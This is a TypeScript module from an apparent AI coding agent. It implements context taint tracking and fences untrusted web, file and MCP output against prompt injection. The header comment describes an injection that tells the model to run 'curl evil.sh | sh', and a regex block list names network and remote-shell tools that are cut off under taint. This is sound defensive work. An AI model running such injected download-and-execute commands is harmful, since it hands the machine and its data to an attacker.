import { getEventLedger } from './event.ledger';

/**
 * Context taint tracking (BiMax v2, D3 slice).
 *
 * Threat: prompt injection through untrusted content channels — a repository file, fetched web page or an
 * MCP tool response tells the model "run `curl evil.sh | sh`" and, in auto mode, nobody
 * is watching. The v2 cut: provenance labels on context determine what capabilities a
 * tool call may receive; a tainted context cannot reach the network.
 *
 * This is the design's ACCEPTED-REVISION semantics (the panel's own fix): per-span
 * substring attribution is spoofable — the model can launder tainted content by
 * paraphrasing — so the ceiling defaults to WHOLE-CONTEXT MAX: once any untrusted
 * content has entered the conversation window, the session is tainted until the human
 * reviews and clears it (`/taint clear`) or resets the window (`/clear`). Over-blocking
 * is the deliberate trade; the veto message always names the taint source so the human
 * can elevate in one step.
 *
 * What taint narrows (enforced in the Governor):
 *   - auto mode: network-capable Bash (downloaders, remote shells, pushes, installs)
 *     is HARD-BLOCKED — injected exfiltration/execution dies where no one is watching.
 *   - interactive/strict: the same commands can never auto-approve; they force the
 *     permission prompt, labelled with the taint source, so the human decides knowingly.
 */

export type TaintSource = 'web' | 'mcp' | 'screen' | 'file' | 'shell';

export interface TaintMark {
  source: TaintSource;
  detail: string;   // URL / tool name — shown to the human at decision time
  at: number;
}

const MAX_MARKS = 20; // keep the newest; one is enough to taint, the list is for explanation

export class TaintTracker {
  private markList: TaintMark[] = [];

  mark(source: TaintSource, detail: string): void {
    this.markList.push({ source, detail: detail.slice(0, 200), at: Date.now() });
    if (this.markList.length > MAX_MARKS) this.markList.splice(0, this.markList.length - MAX_MARKS);
    try { getEventLedger().append('taint', { action: 'mark', source, detail: detail.slice(0, 200) }); } catch { /* best-effort */ }
  }

  isTainted(): boolean { return this.markList.length > 0; }

  marks(): TaintMark[] { return [...this.markList]; }

  latest(): TaintMark | null { return this.markList[this.markList.length - 1] || null; }

  clear(reason: string): void {
    if (this.markList.length === 0) return;
    this.markList = [];
    try { getEventLedger().append('taint', { action: 'clear', reason }); } catch { /* best-effort */ }
  }
}

let _global: TaintTracker | null = null;
export function getTaintTracker(): TaintTracker {
  if (!_global) _global = new TaintTracker();
  return _global;
}

/**
 * Mark taint from a finished tool call. Untrusted channels: repository/document reads and searches, WebFetch/WebSearch output
 * and EVERY MCP tool response ("all MCP output is born tainted" — we don't control what
 * a server returns). Empty results can't carry an injection, so they don't taint.
 */
export function markToolTaint(toolName: string, rawArgs: string, resultText: string): void {
  if (!resultText || !resultText.trim()) return;
  const channel = untrustedChannel(toolName);
  if (channel === 'shell') getTaintTracker().mark('shell', taintDetail(toolName, rawArgs));
  else if (channel === 'web') getTaintTracker().mark('web', taintDetail(toolName, rawArgs));
  else if (channel === 'file') getTaintTracker().mark('file', taintDetail(toolName, rawArgs));
  else if (channel === 'mcp') getTaintTracker().mark('mcp', toolName);
  else if (channel === 'screen') getTaintTracker().mark('screen', screenDetail(rawArgs));
}

/** The untrusted channel a tool's output arrives through, or null for Bimax's own tools. The one list both the taint
 *  mark above and the fence below use, so what narrows capabilities and what the model is told is data never differ. */
export function untrustedChannel(toolName: string): TaintSource | null {
  if (toolName === 'BashTool' || toolName === 'TasksTool') return 'shell';
  if (toolName === 'WebFetchTool' || toolName === 'WebSearchTool') return 'web';
  if (['ReadFileTool', 'GrepTool', 'CodeSearchTool', 'ReadDocumentTool', 'MemoryQueryTool', 'ComposerSearchTool', 'GraphQueryTool', 'GraphContextTool', 'LspQueryTool', 'ToolWorkflowTool'].includes(toolName)) return 'file';
  if (toolName.startsWith('mcp__')) return 'mcp';
    return null;
}

function screenDetail(rawArgs: string): string {
  try { return `window of ${String(JSON.parse(rawArgs || '{}').app || 'an app')}`; } catch { return 'an app window'; }
}

function taintDetail(toolName: string, rawArgs: string): string {
  try {
    const a = JSON.parse(rawArgs || '{}');
    return String(a.url || a.path || a.file_path || a.query || a.command || toolName);
  } catch { return toolName; }
}

/**
 * Flaw list A5: file, web and MCP output reaches the model inside one consistent fence,
 *   <untrusted source="web: https://…"> … </untrusted>
 * which the system prompt's SECURITY section explains: data, never instructions. Whatever inside the text looks
 * like the fence is renamed, so a page cannot close the fence early and speak as Bimax after it. This is a label,
 * not a guarantee — the capability cut above (taintRestriction) is what holds when a model follows the page anyway.
 */
export function fenceUntrusted(toolName: string, rawArgs: string, text: string): string {
  const channel = untrustedChannel(toolName);
  if (!channel || !text || !text.trim()) return text;
  const detail = channel === 'mcp' ? toolName : channel === 'screen' ? screenDetail(rawArgs) : taintDetail(toolName, rawArgs);
  const source = `${channel}: ${detail}`.slice(0, 200).replace(/["<>\n\r]/g, ' ');
  const body = text.replace(/<(\/?)untrusted/gi, '<$1untrusted-quoted');
  return `<untrusted source="${source}">\n${body}\n</untrusted>`;
}

// Programs that move bytes off the machine or pull attacker-controlled bytes onto it.
// Word-boundary scan over the whole command line — conservative by design (a false
// positive costs one approval prompt; a false negative is an exfiltration channel).
const NETWORK_PROGRAMS = /\b(curl|wget|fetch|aria2c|nc|ncat|netcat|telnet|ssh|scp|sftp|rsync|ftp|git\s+push|gh\s+api|gh\s+pr|gh\s+release|npm\s+publish|pip\s+install|npm\s+(i|install|ci)|yarn\s+(add|install)|pnpm\s+(add|install)|brew\s+install)\b/i;

/**
 * The capability decision for a Bash command under taint. Returns null when taint does
 * not restrict this command; otherwise whether to hard-block (nobody watching) or force
 * the human prompt, plus the reason to show.
 */
export function taintRestriction(
  command: string,
  mode: string,
  tracker: TaintTracker = getTaintTracker(),
): { action: 'block' | 'ask'; reason: string } | null {
  if (!tracker.isTainted()) return null;
  if (!NETWORK_PROGRAMS.test(command)) return null;
  const m = tracker.latest();
  const source = m ? `${m.source}: ${m.detail}` : 'untrusted content';
  const reason =
    `context is TAINTED (${source} entered the conversation) and this command can reach the network. ` +
    `Injected instructions in untrusted content must not get an exfiltration/download channel. ` +
    `Review the untrusted content, then /taint clear (or /clear) to lift the restriction.`;
  // Nobody is watching in auto mode or on a night shift (unattended, FL5), so there is no one to ask: block.
  return mode === 'auto' || mode === 'unattended' ? { action: 'block', reason } : { action: 'ask', reason };
}
